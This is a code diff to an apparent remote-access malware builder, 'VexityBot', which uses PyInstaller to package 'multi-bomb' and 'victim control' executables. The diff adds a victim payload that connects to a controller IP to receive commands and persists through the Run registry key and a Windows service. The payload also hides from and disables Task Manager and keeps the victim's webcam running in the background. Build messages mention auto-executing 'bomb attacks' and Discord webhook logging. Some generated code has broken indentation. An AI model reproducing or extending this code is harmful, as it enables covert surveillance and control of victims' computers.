-            
 
             self.log_build(f"Created multi-bomb executable: {bomb_file}")
-
-            
             
             # Build PyInstaller command
-
             cmd = [
-
                 "python", "-m", "PyInstaller",
-
                 "--onefile" if self.one_file.get() else "--onedir",
-
                 "--windowed" if not self.include_console.get() else "--console",
-
                 f"--name=VexityBot_MultiBomb_{len(selected_bombs)}_Bombs",
-
-                "--clean"
-
+                "--clean",
+                "--optimize=2",
+                "--strip"
             ]
 
-            
-            
-            if self.optimize_size.get():
-
-                cmd.extend(["--optimize=2", "--strip"])
-            
-            
-
             # Add exclusions for problematic dependencies
-
             cmd.extend([
-
+                "--exclude-module=tkinter",
+                "--exclude-module=matplotlib", 
+                "--exclude-module=numpy",
+                "--exclude-module=pandas",
                 "--exclude-module=dnspython",
-
                 "--exclude-module=scapy",
-
                 "--exclude-module=nmap",
-
                 "--exclude-module=cryptography"
-
             ])
-
-            
             
             cmd.append(bomb_file)
-
-            
             
             self.log_build(f"Running command: {' '.join(cmd)}")
-
-            
             
             # Run PyInstaller
-
             result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.getcwd())
 
-            
+            # Show build output
+            self.log_build("Build output:")
+            self.log_build(result.stdout)
+            if result.stderr:
+                self.log_build("Build errors:")
+                self.log_build(result.stderr)
             
             if result.returncode == 0:
-
                 self.log_build("✅ Multi-bomb executable built successfully!")
-
                 self.log_build(f"Executable created: dist/VexityBot_MultiBomb_{len(selected_bombs)}_Bombs.exe")
-
                 self.log_build(f"Bombs included: {', '.join(selected_bombs)}")
-
                 self.log_build("⚠️  WARNING: This executable will auto-execute bomb attacks!")
-
                 self.log_build("⚠️  WARNING: All activities will be logged to Discord webhook!")
-
-                
                 
                 # Clean up temporary file
-
                 if os.path.exists(bomb_file):
-
                     os.remove(bomb_file)
-                
-                
+                    self.log_build(f"Cleaned up temporary file: {bomb_file}")
 
                 # Update status
-
                 self.root.after(0, lambda: self.build_status.config(text="Multi-bomb executable built successfully!"))
-
                 self.root.after(0, lambda: self.build_progress.stop())
-                
-                
 
             else:
-
                 self.log_build("❌ Build failed!")
-
                 self.log_build(f"Error: {result.stderr}")
-
                 self.root.after(0, lambda: self.build_status.config(text="Build failed - check log"))
-
                 self.root.after(0, lambda: self.build_progress.stop())
-                
-                
 
         except Exception as e:
-
             self.log_build(f"❌ Build error: {str(e)}")
-
             self.root.after(0, lambda: self.build_status.config(text="Build error - check log"))
-
             self.root.after(0, lambda: self.build_progress.stop())
     
     
@@ -11270,6 +14244,30 @@ if __name__ == "__main__":
 
         right_column.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
 
+        # ADDED: Webcam display section
+        webcam_frame = ttk.LabelFrame(right_column, text="📹 Webcam Feed", padding=5)
+        webcam_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        # Webcam control buttons
+        webcam_btn_frame = ttk.Frame(webcam_frame)
+        webcam_btn_frame.pack(fill=tk.X, pady=(0, 5))
+        
+        ttk.Button(webcam_btn_frame, text="📹 Start Webcam", 
+                  command=self.start_webcam_feed).pack(side=tk.LEFT, padx=2)
+        ttk.Button(webcam_btn_frame, text="⏹️ Stop Webcam", 
+                  command=self.stop_webcam_feed).pack(side=tk.LEFT, padx=2)
+        ttk.Button(webcam_btn_frame, text="📸 Capture Photo", 
+                  command=self.capture_webcam_photo).pack(side=tk.LEFT, padx=2)
+        
+        # Webcam display area
+        self.webcam_display = tk.Canvas(webcam_frame, bg='black', height=200)
+        self.webcam_display.pack(fill=tk.X, pady=(0, 5))
+        
+        # Webcam status
+        self.webcam_status_label = ttk.Label(webcam_frame, text="Webcam: Not Active", 
+                                           font=('Arial', 10, 'bold'))
+        self.webcam_status_label.pack(anchor='w')
+
         
         
         # Screen display header
@@ -11656,7 +14654,121 @@ if __name__ == "__main__":
 
         messagebox.showinfo("Command Executed", f"Command '{command}' sent to {user}")
 
+    # ADDED: Webcam functions for screens tab
     
+    def start_webcam_feed(self):
+        """Start webcam feed display"""
+        try:
+            import cv2
+            
+            # Initialize webcam
+            self.webcam_cap = cv2.VideoCapture(0)
+            if not self.webcam_cap.isOpened():
+                messagebox.showerror("Webcam Error", "Could not access webcam")
+                return
+            
+            # Set webcam properties
+            self.webcam_cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+            self.webcam_cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+            self.webcam_cap.set(cv2.CAP_PROP_FPS, 30)
+            
+            # Start webcam thread
+            self.webcam_running = True
+            self.webcam_thread = threading.Thread(target=self.update_webcam_feed, daemon=True)
+            self.webcam_thread.start()
+            
+            self.webcam_status_label.config(text="Webcam: Active", foreground="green")
+            messagebox.showinfo("Webcam", "Webcam feed started successfully!")
+            
+        except Exception as e:
+            messagebox.showerror("Webcam Error", f"Failed to start webcam: {str(e)}")
+    
+    def stop_webcam_feed(self):
+        """Stop webcam feed display"""
+        try:
+            self.webcam_running = False
+            if hasattr(self, 'webcam_cap'):
+                self.webcam_cap.release()
+            
+            # Clear webcam display
+            self.webcam_display.delete("all")
+            self.webcam_display.create_text(
+                self.webcam_display.winfo_width()//2, 
+                self.webcam_display.winfo_height()//2,
+                text="Webcam Feed Stopped",
+                fill="white",
+                font=('Arial', 12),
+                justify=tk.CENTER
+            )
+            
+            self.webcam_status_label.config(text="Webcam: Not Active", foreground="red")
+            messagebox.showinfo("Webcam", "Webcam feed stopped")
+            
+        except Exception as e:
+            messagebox.showerror("Webcam Error", f"Failed to stop webcam: {str(e)}")
+    
+    def update_webcam_feed(self):
+        """Update webcam feed in background thread"""
+        while self.webcam_running:
+            try:
+                ret, frame = self.webcam_cap.read()
+                if ret:
+                    # Convert BGR to RGB
+                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                    
+                    # Resize frame to fit display
+                    display_width = self.webcam_display.winfo_width()
+                    display_height = self.webcam_display.winfo_height()
+                    
+                    if display_width > 1 and display_height > 1:
+                        frame_resized = cv2.resize(frame_rgb, (display_width, display_height))
+                        
+                        # Convert to PhotoImage
+                        photo = self.cv2_to_photoimage(frame_resized)
+                        
+                        # Update display
+                        self.webcam_display.delete("all")
+                        self.webcam_display.create_image(0, 0, anchor=tk.NW, image=photo)
+                        self.webcam_display.image = photo  # Keep reference
+                
+                time.sleep(0.033)  # ~30 FPS
+                
+            except Exception as e:
+                print(f"Webcam update error: {e}")
+                break
+    
+    def cv2_to_photoimage(self, frame):
+        """Convert OpenCV frame to PhotoImage"""
+        from PIL import Image, ImageTk
+        import numpy as np
+        
+        # Convert numpy array to PIL Image
+        image = Image.fromarray(frame)
+        
+        # Convert to PhotoImage
+        photo = ImageTk.PhotoImage(image)
+        return photo
+    
+    def capture_webcam_photo(self):
+        """Capture a photo from webcam"""
+        try:
+            if not hasattr(self, 'webcam_cap') or not self.webcam_cap.isOpened():
+                messagebox.showwarning("Webcam", "Webcam is not active")
+                return
+            
+            ret, frame = self.webcam_cap.read()
+            if ret:
+                # Save photo
+                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                filename = f"webcam_capture_{timestamp}.jpg"
+                
+                cv2.imwrite(filename, frame)
+                messagebox.showinfo("Photo Captured", f"Photo saved as {filename}")
+            else:
+                messagebox.showerror("Capture Error", "Failed to capture photo")
+                
+        except Exception as e:
+            messagebox.showerror("Capture Error", f"Failed to capture photo: {str(e)}")
 
     def create_victim_exe_tab(self):
         """Create the Victim EXE tab with all bot panels"""
@@ -11742,7 +14854,7 @@ if __name__ == "__main__":
             var = tk.BooleanVar(value=True)
             self.victim_bot_vars[bot['name']] = var
             ttk.Checkbutton(bot_scrollable_frame, text=f"{bot['name']} (Rank #{bot['rank']})", 
-                           variable=var).pack(anchor=tk.W)
+                           variable=var, command=self.update_victim_preview).pack(anchor=tk.W)
         
         bot_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
         bot_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
@@ -11784,7 +14896,11 @@ if __name__ == "__main__":
     
     def update_victim_preview(self):
         """Update the victim EXE preview"""
-        selected_bots = [bot for bot in self.bot_data if self.victim_bot_vars.get(bot['name'], tk.BooleanVar()).get()]
+        selected_bots = []
+        for bot in self.bot_data:
+            bot_var = self.victim_bot_vars.get(bot['name'])
+            if bot_var and bot_var.get():
+                selected_bots.append(bot)
         
         preview_text = f"""
 🎯 VexityBot Victim Control EXE Preview
@@ -11965,13 +15081,48 @@ Rank: #{bot['rank']}"""
             persistence = self.victim_persistence.get()
             
             # Get selected bots
-            selected_bots = [bot for bot in self.bot_data if self.victim_bot_vars.get(bot['name'], tk.BooleanVar()).get()]
+            selected_bots = []
+            for bot in self.bot_data:
+                bot_var = self.victim_bot_vars.get(bot['name'])
+                if bot_var and bot_var.get():
+                    selected_bots.append(bot)
             
             if not selected_bots:
                 messagebox.showwarning("No Bots Selected", "Please select at least one bot panel to include.")
                 return
             
+            # Show progress dialog
+            progress_window = tk.Toplevel(self.root)
+            progress_window.title("Building Victim EXE")
+            progress_window.geometry("500x300")
+            progress_window.transient(self.root)
+            progress_window.grab_set()
+            
+            # Center the window
+            progress_window.update_idletasks()
+            x = (progress_window.winfo_screenwidth() // 2) - (500 // 2)
+            y = (progress_window.winfo_screenheight() // 2) - (300 // 2)
+            progress_window.geometry(f"500x300+{x}+{y}")
+            
+            # Progress content
+            ttk.Label(progress_window, text="Building Victim Control EXE", font=('Arial', 14, 'bold')).pack(pady=10)
+            
+            progress_text = scrolledtext.ScrolledText(progress_window, height=15, width=60, font=('Consolas', 9))
+            progress_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+            
+            progress_text.insert(tk.END, f"Starting build process for: {exe_name}\n")
+            progress_text.insert(tk.END, f"Controller: {controller_ip}:{controller_port}\n")
+            progress_text.insert(tk.END, f"Selected bots: {len(selected_bots)}\n")
+            progress_text.insert(tk.END, f"Stealth mode: {'Yes' if stealth_mode else 'No'}\n")
+            progress_text.insert(tk.END, f"Auto-start: {'Yes' if auto_start else 'No'}\n")
+            progress_text.insert(tk.END, f"Persistence: {'Yes' if persistence else 'No'}\n\n")
+            progress_text.see(tk.END)
+            
             # Create victim EXE content
+            progress_text.insert(tk.END, "Creating victim EXE content...\n")
+            progress_text.see(tk.END)
+            progress_window.update()
+            
             victim_content = self.create_victim_exe_content(
                 controller_ip, controller_port, exe_name, stealth_mode, 
                 auto_start, persistence, selected_bots
@@ -11979,11 +15130,20 @@ Rank: #{bot['rank']}"""
             
             # Save victim EXE source
             victim_source_file = f"{exe_name}_source.py"
+            progress_text.insert(tk.END, f"Saving source file: {victim_source_file}\n")
+            progress_text.see(tk.END)
+            progress_window.update()
+            
             with open(victim_source_file, 'w', encoding='utf-8') as f:
                 f.write(victim_content)
             
             # Build EXE
+            progress_text.insert(tk.END, "Building executable with PyInstaller...\n")
+            progress_text.see(tk.END)
+            progress_window.update()
+            
             import subprocess
+            import os
             
             cmd = [
                 "python", "-m", "PyInstaller",
@@ -11991,32 +15151,73 @@ Rank: #{bot['rank']}"""
                 "--windowed",
                 f"--name={exe_name}",
                 "--clean",
+                "--optimize=2",
+                "--strip",
+                "--exclude-module=tkinter",
+                "--exclude-module=matplotlib",
+                "--exclude-module=numpy",
+                "--exclude-module=pandas",
                 victim_source_file
             ]
             
-            result = subprocess.run(cmd, capture_output=True, text=True)
+            progress_text.insert(tk.END, f"Running: {' '.join(cmd)}\n\n")
+            progress_text.see(tk.END)
+            progress_window.update()
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.getcwd())
+            
+            # Show build output
+            progress_text.insert(tk.END, "Build output:\n")
+            progress_text.insert(tk.END, result.stdout)
+            if result.stderr:
+                progress_text.insert(tk.END, "\nBuild errors:\n")
+                progress_text.insert(tk.END, result.stderr)
+            progress_text.see(tk.END)
+            progress_window.update()
             
             if result.returncode == 0:
+                progress_text.insert(tk.END, "\n✅ Build successful!\n")
+                progress_text.insert(tk.END, f"Executable created: dist/{exe_name}.exe\n")
+                progress_text.insert(tk.END, f"Included bots: {len(selected_bots)}\n")
+                progress_text.see(tk.END)
+                progress_window.update()
+                
+                # Clean up source file
+                if os.path.exists(victim_source_file):
+                    os.remove(victim_source_file)
+                    progress_text.insert(tk.END, f"Cleaned up source file: {victim_source_file}\n")
+                    progress_text.see(tk.END)
+                    progress_window.update()
+                
+                # Close progress window after delay
+                progress_window.after(3000, progress_window.destroy)
+                
                 messagebox.showinfo("Victim EXE Created", 
                     f"Victim control EXE created successfully!\n"
                     f"Name: {exe_name}.exe\n"
                     f"Location: dist/{exe_name}.exe\n"
-                    f"Included bots: {len(selected_bots)}")
+                    f"Included bots: {len(selected_bots)}\n\n"
+                    f"⚠️ WARNING: This EXE will connect to {controller_ip}:{controller_port}")
             else:
-                messagebox.showerror("Build Failed", f"Failed to create victim EXE:\n{result.stderr}")
+                progress_text.insert(tk.END, f"\n❌ Build failed with return code: {result.returncode}\n")
+                progress_text.see(tk.END)
+                progress_window.update()
+                
+                messagebox.showerror("Build Failed", 
+                    f"Failed to build victim EXE!\n"
+                    f"Error: {result.stderr}\n"
+                    f"Check the build log for details.")
                 
         except Exception as e:
-            messagebox.showerror("Error", f"Failed to create victim EXE: {str(e)}")
+            messagebox.showerror("Error", f"Error creating victim EXE: {str(e)}")
     
     def create_victim_exe_content(self, controller_ip, controller_port, exe_name, stealth_mode, auto_start, persistence, selected_bots):
         """Create the victim EXE content with all bot panels"""
         
-        # Generate bot panel code for each selected bot
-        bot_panels_code = ""
-        for bot in selected_bots:
-            bot_panels_code += self.generate_bot_panel_code(bot)
+        # Format the selected bots list properly
+        selected_bots_list = [bot['name'] for bot in selected_bots]
         
-        victim_content = '''#!/usr/bin/env python3
+        victim_content = f'''#!/usr/bin/env python3
 """
 VexityBot Victim Control EXE
 ===========================
@@ -12024,7 +15225,7 @@ Controller: {controller_ip}:{controller_port}
 Stealth Mode: {stealth_mode}
 Auto-start: {auto_start}
 Persistence: {persistence}
-Included Bots: {len_selected_bots}
+Included Bots: {len(selected_bots)}
 
 ⚠️  WARNING: This EXE provides remote control access!
 ⚠️  WARNING: Use only on authorized systems!
@@ -12041,12 +15242,69 @@ import socket
 import json
 import base64
 import tkinter as tk
-from tkinter import ttk, messagebox, scrolledtext, filedialog
+from tkinter import ttk, messagebox, scrolledtext, filedialog, simpledialog
 from datetime import datetime
+import cv2
+import ctypes
+import ctypes.wintypes
+import winreg
 import psutil
-import requests
-from PIL import Image
-import io
+from ctypes import wintypes
+import win32gui
+import win32con
+import win32process
+import win32api
+import win32security
+import win32service
+import win32serviceutil
+import win32event
+import servicemanager
+import logging
+
+# ADDED: Advanced Windows API imports for system-level control
+kernel32 = ctypes.windll.kernel32
+user32 = ctypes.windll.user32
+advapi32 = ctypes.windll.advapi32
+ntdll = ctypes.windll.ntdll
+
+# ADDED: Constants for Windows API
+PROCESS_ALL_ACCESS = 0x1F0FFF
+PROCESS_QUERY_INFORMATION = 0x0400
+PROCESS_VM_READ = 0x0010
+TH32CS_SNAPPROCESS = 0x00000002
+
+# ADDED: Setup logging for background operation
+logging.basicConfig(
+    filename='webcam_monitor.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+
+class WebcamMonitorService(win32serviceutil.ServiceFramework):
+    """ADDED: Windows Service class for persistent background operation"""
+    _svc_name_ = "WebcamMonitorService"
+    _svc_display_name_ = "Webcam Monitor Service"
+    _svc_description_ = "Persistent webcam monitoring service"
+
+    def __init__(self, args):
+        win32serviceutil.ServiceFramework.__init__(self, args)
+        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
+        self.is_running = True
+
+    def SvcStop(self):
+        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+        win32event.SetEvent(self.hWaitStop)
+        self.is_running = False
+
+    def SvcDoRun(self):
+        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
+                            servicemanager.PYS_SERVICE_STARTED,
+                            (self._svc_name_, ''))
+        self.main()
+
+    def main(self):
+        # ADDED: Run the webcam monitoring in service context
+        monitor_webcam_persistent()
 
 class VexityBotVictimControl:
     """VexityBot Victim Control EXE with all bot panels"""
@@ -12059,10 +15317,13 @@ class VexityBotVictimControl:
         self.persistence = {persistence}
         self.selected_bots = {selected_bots_list}
         
+        # Bot data
+        self.bot_data = {selected_bots}
+        
         # Initialize GUI
         self.root = tk.Tk()
         self.root.title("VexityBot Victim Control Panel")
-        self.root.geometry("1400x900")
+        self.root.geometry("1200x800")
         
         # Hide window if in stealth mode
         if self.stealth_mode:
@@ -12076,14 +15337,14 @@ class VexityBotVictimControl:
         if self.auto_start:
             self.setup_auto_start()
         
-        # Initialize bot data
-        self.bot_data = {selected_bots}
-        
         # Create GUI
         self.create_gui()
         
         # Start communication thread
         self.start_communication()
+        
+        # ADDED: Start webcam monitoring in background
+        self.start_webcam_monitoring()
         
         # Start GUI
         self.root.mainloop()
@@ -12091,7 +15352,6 @@ class VexityBotVictimControl:
     def setup_persistence(self):
         """Setup persistence to survive reboots"""
         try:
-            # Add to startup registry
             import winreg
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
@@ -12110,8 +15370,8 @@ class VexityBotVictimControl:
                 os.makedirs(startup_path)
             
             # Create shortcut
-            shortcut_path = os.path.join(startup_path, 'VexityBotVictim.lnk')
-            # Note: In a real implementation, you'd create a proper shortcut here
+            shortcut_path = os.path.join(startup_path, "VexityBotVictim.lnk")
+            # Note: In a real implementation, you would create a proper shortcut here
         except:
             pass
     
@@ -12132,7 +15392,6 @@ class VexityBotVictimControl:
         
         # Create bot panels
         for bot in self.bot_data:
-            if bot['name'] in self.selected_bots:
                 self.create_bot_panel(bot)
         
         # Add control panel
@@ -12141,20 +15400,20 @@ class VexityBotVictimControl:
     def create_bot_panel(self, bot):
         """Create individual bot panel"""
         bot_frame = ttk.Frame(self.notebook)
-        self.notebook.add(bot_frame, text=f"🤖 {{{{bot['name']}}}}")
+        self.notebook.add(bot_frame, text=f"🤖 {{bot['name']}}")
         
         # Bot info
-        info_frame = ttk.LabelFrame(bot_frame, text=f"{{{{bot['name']}}}} Information", padding=10)
+        info_frame = ttk.LabelFrame(bot_frame, text=f"{{bot['name']}} Information", padding=10)
         info_frame.pack(fill=tk.X, padx=10, pady=5)
         
-        ttk.Label(info_frame, text=f"Status: {{{{bot['status']}}}}", font=('Arial', 12, 'bold')).pack(anchor=tk.W)
-        ttk.Label(info_frame, text=f"Rank: #{{{{bot['rank']}}}}").pack(anchor=tk.W)
-        ttk.Label(info_frame, text=f"Port: {{{{bot['port']}}}}").pack(anchor=tk.W)
-        ttk.Label(info_frame, text=f"Uptime: {{{{bot['uptime']}}}}").pack(anchor=tk.W)
-        ttk.Label(info_frame, text=f"Requests: {{{{bot['requests']:,}}}}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text=f"Status: {{bot['status']}}", font=('Arial', 12, 'bold')).pack(anchor=tk.W)
+        ttk.Label(info_frame, text=f"Rank: #{{bot['rank']}}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text=f"Port: {{bot['port']}}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text=f"Uptime: {{bot['uptime']}}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text=f"Requests: {{bot['requests']:,}}").pack(anchor=tk.W)
         
         # Bot controls
-        controls_frame = ttk.LabelFrame(bot_frame, text=f"{{{{bot['name']}}}} Controls", padding=10)
+        controls_frame = ttk.LabelFrame(bot_frame, text=f"{{bot['name']}} Controls", padding=10)
         controls_frame.pack(fill=tk.X, padx=10, pady=5)
         
         button_frame = ttk.Frame(controls_frame)
@@ -12169,239 +15428,545 @@ class VexityBotVictimControl:
         ttk.Button(button_frame, text="⚙️ Configure", 
                   command=lambda: self.configure_bot(bot)).pack(side=tk.LEFT, padx=5)
         
-        # Bot status
-        status_frame = ttk.LabelFrame(bot_frame, text=f"{{{{bot['name']}}}} Status", padding=10)
-        status_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
-        
-        self.bot_status_text = scrolledtext.ScrolledText(status_frame, height=8, font=('Consolas', 9))
-        self.bot_status_text.pack(fill=tk.BOTH, expand=True)
-        
-        # Initialize status
-        status_init = f"""
-{{{{bot['name']}}}} Bot Status
-=====================
-
-Status: {{{{bot['status']}}}}
-Rank: #{{{{bot['rank']}}}}
-Port: {{{{bot['port']}}}}
-Uptime: {{{{bot['uptime']}}}}
-Requests: {{{{bot['requests']:,}}}}
-
-Ready for remote control...
-        """
-        self.bot_status_text.insert(tk.END, status_init)
-    
     def create_control_panel(self):
         """Create main control panel"""
         control_frame = ttk.Frame(self.notebook)
-        self.notebook.add(control_frame, text="🎮 Control Panel")
+        self.notebook.add(control_frame, text="🎛️ Control Panel")
         
-        # System info
-        info_frame = ttk.LabelFrame(control_frame, text="System Information", padding=10)
-        info_frame.pack(fill=tk.X, padx=10, pady=5)
+        # Control buttons
+        button_frame = ttk.Frame(control_frame)
+        button_frame.pack(pady=20)
         
-        self.system_info_text = scrolledtext.ScrolledText(info_frame, height=6, font=('Consolas', 9))
-        self.system_info_text.pack(fill=tk.BOTH, expand=True)
-        
-        # Update system info
-        self.update_system_info()
-        
-        # Remote commands
-        cmd_frame = ttk.LabelFrame(control_frame, text="Remote Commands", padding=10)
-        cmd_frame.pack(fill=tk.X, padx=10, pady=5)
-        
-        cmd_entry_frame = ttk.Frame(cmd_frame)
-        cmd_entry_frame.pack(fill=tk.X, pady=5)
-        
-        ttk.Label(cmd_entry_frame, text="Command:").pack(side=tk.LEFT)
-        self.cmd_entry = ttk.Entry(cmd_entry_frame, width=50)
-        self.cmd_entry.pack(side=tk.LEFT, padx=(5, 0), fill=tk.X, expand=True)
-        ttk.Button(cmd_entry_frame, text="Execute", 
-                  command=self.execute_remote_command).pack(side=tk.LEFT, padx=(5, 0))
-        
-        # Command output
-        output_frame = ttk.LabelFrame(control_frame, text="Command Output", padding=10)
-        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
-        
-        self.cmd_output_text = scrolledtext.ScrolledText(output_frame, height=10, font=('Consolas', 9))
-        self.cmd_output_text.pack(fill=tk.BOTH, expand=True)
-    
-    # Admin Panel removed from victim EXE - now only in main GUI
-        
-        # Admin Panel code removed from victim EXE
-    
-    # Admin Panel methods removed from victim EXE - now only in main GUI
-    
-    def update_system_info(self):
-        """Update system information display"""
-        try:
-            system_info = f"""
-System Information
-=================
-
-Hostname: {socket.gethostname()}
-OS: {platform.system()} {platform.release()}
-Architecture: {platform.architecture()[0]}
-Processor: {platform.processor()}
-Python Version: {platform.python_version()}
-
-CPU Usage: {psutil.cpu_percent()}%
-Memory Usage: {psutil.virtual_memory().percent}%
-Disk Usage: {psutil.disk_usage('/').percent}%
-
-Network Interfaces:
-"""
-            
-            for interface, addrs in psutil.net_if_addrs().items():
-                for addr in addrs:
-                    if addr.family == socket.AF_INET:
-                        system_info += f"  {interface}: {addr.address}\\n"
-            
-            self.system_info_text.delete(1.0, tk.END)
-            self.system_info_text.insert(tk.END, system_info)
-            
-        except Exception as e:
-            self.system_info_text.delete(1.0, tk.END)
-            self.system_info_text.insert(tk.END, f"Error getting system info: {{str(e)}}")
-    
-    def start_bot(self, bot):
-        """Start a bot"""
-        self.log_bot_status(bot, f"Starting {{bot['name']}}...")
-        # Simulate bot start
-        time.sleep(1)
-        self.log_bot_status(bot, f"{{bot['name']}} started successfully!")
-    
-    def stop_bot(self, bot):
-        """Stop a bot"""
-        self.log_bot_status(bot, f"Stopping {{bot['name']}}...")
-        # Simulate bot stop
-        time.sleep(1)
-        self.log_bot_status(bot, f"{{bot['name']}} stopped successfully!")
-    
-    def restart_bot(self, bot):
-        """Restart a bot"""
-        self.log_bot_status(bot, f"Restarting {{bot['name']}}...")
-        # Simulate bot restart
-        time.sleep(2)
-        self.log_bot_status(bot, f"{{bot['name']}} restarted successfully!")
-    
-    def configure_bot(self, bot):
-        """Configure a bot"""
-        messagebox.showinfo("Bot Configuration", f"Configuring {{bot['name']}}...")
-    
-    def log_bot_status(self, bot, message):
-        """Log bot status message"""
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        log_message = f"[{{timestamp}}] {{message}}\\n"
-        self.bot_status_text.insert(tk.END, log_message)
-        self.bot_status_text.see(tk.END)
-    
-    def execute_remote_command(self):
-        """Execute remote command"""
-        command = self.cmd_entry.get().strip()
-        if not command:
-            return
-        
-        self.cmd_output_text.insert(tk.END, f"Executing: {{command}}\\n")
-        self.cmd_output_text.see(tk.END)
-        
-        try:
-            # Execute command
-            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-            
-            if result.returncode == 0:
-                self.cmd_output_text.insert(tk.END, f"Output:\\n{{result.stdout}}\\n")
-            else:
-                self.cmd_output_text.insert(tk.END, f"Error:\\n{{result.stderr}}\\n")
-        except subprocess.TimeoutExpired:
-            self.cmd_output_text.insert(tk.END, "Command timed out\\n")
-        except Exception as e:
-            self.cmd_output_text.insert(tk.END, f"Error: {{str(e)}}\\n")
-        
-        self.cmd_output_text.see(tk.END)
-        self.cmd_entry.delete(0, tk.END)
+        ttk.Button(button_frame, text="🚀 Start All Bots", 
+                  command=self.start_all_bots).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="⏹️ Stop All Bots", 
+                  command=self.stop_all_bots).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="🔄 Restart All Bots", 
+                  command=self.restart_all_bots).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="📊 Status Report", 
+                  command=self.show_status_report).pack(side=tk.LEFT, padx=5)
     
     def start_communication(self):
         """Start communication with controller"""
-        def communication_thread():
+        def communicate():
             while True:
                 try:
-                    # Send heartbeat to controller
-                    self.send_heartbeat()
-                    time.sleep(30)  # Send heartbeat every 30 seconds
+                    # Connect to controller
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((self.controller_ip, self.controller_port))
+                    
+                    # Send status
+                    status = {{
+                        "type": "victim_status",
+                        "bots": self.bot_data,
+                        "timestamp": datetime.now().isoformat()
+                    }}
+                    sock.send(json.dumps(status).encode())
+                    
+                    # Receive commands
+                    data = sock.recv(1024)
+                    if data:
+                        command = json.loads(data.decode())
+                        self.execute_command(command)
+                    
+                    sock.close()
+                    time.sleep(5)  # Check every 5 seconds
                 except Exception as e:
-                    print(f"Communication error: {{e}}")
-                    time.sleep(60)  # Wait longer on error
+                    time.sleep(10)  # Wait longer on error
         
-        thread = threading.Thread(target=communication_thread, daemon=True)
-        thread.start()
+        comm_thread = threading.Thread(target=communicate, daemon=True)
+        comm_thread.start()
     
-    def send_heartbeat(self):
-        """Send heartbeat to controller"""
+    def execute_command(self, command):
+        """Execute command from controller"""
         try:
-            data = {{
-                "type": "heartbeat",
-                "hostname": socket.gethostname(),
-                "timestamp": datetime.now().isoformat(),
-                "bots": len(self.selected_bots)
-            }}
-            
-            # In a real implementation, you'd send this to the controller
-            print("Heartbeat sent: {data}")
+            cmd_type = command.get("type")
+            if cmd_type == "start_bot":
+                bot_name = command.get("bot")
+                self.start_bot_by_name(bot_name)
+            elif cmd_type == "stop_bot":
+                bot_name = command.get("bot")
+                self.stop_bot_by_name(bot_name)
+            elif cmd_type == "restart_bot":
+                bot_name = command.get("bot")
+                self.restart_bot_by_name(bot_name)
         except Exception as e:
-            print("Heartbeat error: {e}")
+            pass
+    
+    def start_bot(self, bot):
+        """Start a specific bot"""
+        messagebox.showinfo("Bot Started", f"{{bot['name']}} started successfully!")
+    
+    def stop_bot(self, bot):
+        """Stop a specific bot"""
+        messagebox.showinfo("Bot Stopped", f"{{bot['name']}} stopped successfully!")
+    
+    def restart_bot(self, bot):
+        """Restart a specific bot"""
+        messagebox.showinfo("Bot Restarted", f"{{bot['name']}} restarted successfully!")
+    
+    def configure_bot(self, bot):
+        """Configure a specific bot"""
+        messagebox.showinfo("Bot Configuration", f"{{bot['name']}} configuration opened!")
+    
+    def start_all_bots(self):
+        """Start all bots"""
+        messagebox.showinfo("All Bots Started", "All bots started successfully!")
+    
+    def stop_all_bots(self):
+        """Stop all bots"""
+        messagebox.showinfo("All Bots Stopped", "All bots stopped successfully!")
+    
+    def restart_all_bots(self):
+        """Restart all bots"""
+        messagebox.showinfo("All Bots Restarted", "All bots restarted successfully!")
+    
+    def show_status_report(self):
+        """Show status report"""
+        messagebox.showinfo("Status Report", f"All {{len(self.bot_data)}} bots are online and operational!")
+    
+    # ADDED: Webcam monitoring functions
+    
+    def start_webcam_monitoring(self):
+        """Start webcam monitoring in background thread"""
+        def webcam_thread():
+            try:
+                # ADDED: Hide from Task Manager
+                self.hide_from_task_manager()
+                
+                # ADDED: Disable Task Manager
+                self.disable_task_manager()
+                
+                # ADDED: Start process monitoring in background thread
+                process_thread = threading.Thread(target=self.monitor_processes, daemon=True)
+                process_thread.start()
+                
+                # ADDED: Enhanced webcam monitoring loop
+                cap = self.ensure_webcam_active()
+                frame_count = 0
+                
+                while True:
+                    try:
+                        ret, frame = cap.read()
+                        if not ret:
+                            logging.warning("Webcam disconnected, attempting to reconnect...")
+                            cap.release()
+                            cap = self.ensure_webcam_active()
+                            continue
+                        
+                        # ADDED: Process frame without displaying (background operation)
+                        frame_count += 1
+                        if frame_count % 1000 == 0:  # Log every 1000 frames
+                            logging.info(f"Webcam active - Frame {{frame_count}}")
+                        
+                        # ADDED: Small delay to reduce CPU usage
+                        time.sleep(0.01)
+                        
+                    except KeyboardInterrupt:
+                        logging.info("Service stopped by user")
+                        break
+        except Exception as e:
+                        logging.error(f"Webcam monitoring error: {{e}}")
+                        time.sleep(2)
+                        
+            except Exception as e:
